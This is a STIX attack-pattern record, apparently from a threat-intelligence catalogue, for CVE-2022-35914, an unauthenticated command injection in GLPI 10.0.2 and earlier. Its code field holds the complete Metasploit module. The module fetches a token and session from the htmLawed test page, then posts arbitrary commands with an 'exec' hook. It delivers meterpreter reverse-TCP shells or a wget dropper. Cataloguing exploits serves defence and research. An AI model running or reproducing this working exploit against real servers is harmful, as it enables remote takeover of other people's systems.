{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--74fe2900-34b0-4570-8ce4-6af136149d5e",
    "created": "2024-08-14T17:01:25.624145Z",
    "modified": "2024-08-14T17:01:25.62415Z",
    "name": "GLPI htmLawed php command injection",
    "description": " This exploit takes advantage of a unauthenticated php command injection available from GLPI versions 10.0.2 and below to execute a command.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/glpi_htmlawed_php_injection.rb",
            "external_id": "glpi_htmlawed_php_injection.rb"
        },
        {
            "source_name": "cosad3s",
            "external_id": "#PoChttps://github.com/cosad3s/CVE-2022-35914-poc"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-35914"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/cosad3s/CVE-2022-35914-poc"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'GLPI htmLawed php command injection',\n        'Description' => %q{\n          This exploit takes advantage of a unauthenticated php command injection available\n          from GLPI versions 10.0.2 and below to execute a command.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'cosad3s', # PoC https://github.com/cosad3s/CVE-2022-35914-poc\n          'bwatters-r7' # module\n        ],\n        'References' => [\n          ['CVE', '2022-35914' ],\n          ['URL', 'https://github.com/cosad3s/CVE-2022-35914-poc']\n        ],\n        'Platform' => 'linux',\n        'Arch' => [ARCH_X64, ARCH_CMD],\n        'CmdStagerFlavor' => [ 'printf', 'wget' ],\n        'Targets' => [\n          [\n            'Nix Command',\n            {\n              'Platform' => [ 'unix', 'linux' ],\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/python/meterpreter/reverse_tcp',\n                'RPORT' => 80\n              }\n            }\n          ],\n          [\n            'Linux (Dropper)',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X64],\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp',\n                'RPORT' => 80\n              },\n              'Type' => :linux_dropper\n            }\n          ]\n        ],\n        'DisclosureDate' => '2022-01-26',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ]\n        }\n      )\n    )\n    register_options(\n      [\n        Msf::OptString.new('TARGET_URI', [ false, 'URI where glpi is hosted', '/glpi'])\n      ]\n    )\n  end\n\n  def populate_values\n    uri = \"#{datastore['TARGET_URI']}/vendor/htmlawed/htmlawed/htmLawedTest.php\"\n    begin\n      res = send_request_cgi({\n        'method' => 'GET',\n        'uri' => normalize_uri(uri),\n        'connection' => 'keep-alive',\n        'accept' => '*/*'\n      })\n      @html = res.get_html_document\n      @token = @html.at_xpath('//input[@id=\"token\"]')['value']\n      vprint_status(\"token = #{@token}\")\n\n      # sometimes I got > 1 sid.  We must use the last one.\n      @sid = res.get_cookies.match(/.*=(.*?);.*/)[1]\n      vprint_status(\"sid = #{@sid}\")\n    rescue NoMethodError => e\n      elog('Failed to retrieve token or sid', error: e)\n    end\n  end\n\n  def execute_command(cmd, _opts = {})\n    populate_values if @sid.nil? || @token.nil?\n    uri = datastore['TARGET_URI'] + '/vendor/htmlawed/htmlawed/htmLawedTest.php'\n\n    send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(uri),\n      'cookie' => 'sid=' + @sid,\n      'ctype' => 'application/x-www-form-urlencoded',\n      'encode_params' => true,\n      'vars_post' => {\n        'token' => @token,\n        'text' => cmd,\n        'hhook' => 'exec',\n        'sid' => @sid\n      }\n    })\n  end\n\n  def check\n    populate_values if @html_doc.nil?\n    if @token.nil? || @sid.nil? || @html.nil?\n      return Exploit::CheckCode::Safe('Failed to retrieve htmLawed page')\n    end\n    return Exploit::CheckCode::Appears if @html.to_s.include?('htmLawed')\n\n    return Exploit::CheckCode::Safe('Unable to determine htmLawed status')\n  end\n\n  def exploit\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n    case target['Type']\n    when :unix_cmd\n      execute_command(payload.encoded)\n    when :linux_dropper\n      execute_cmdstager\n    end\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2022-01-26",
    "x_mitre_platforms": [
        "linux'"
    ]
}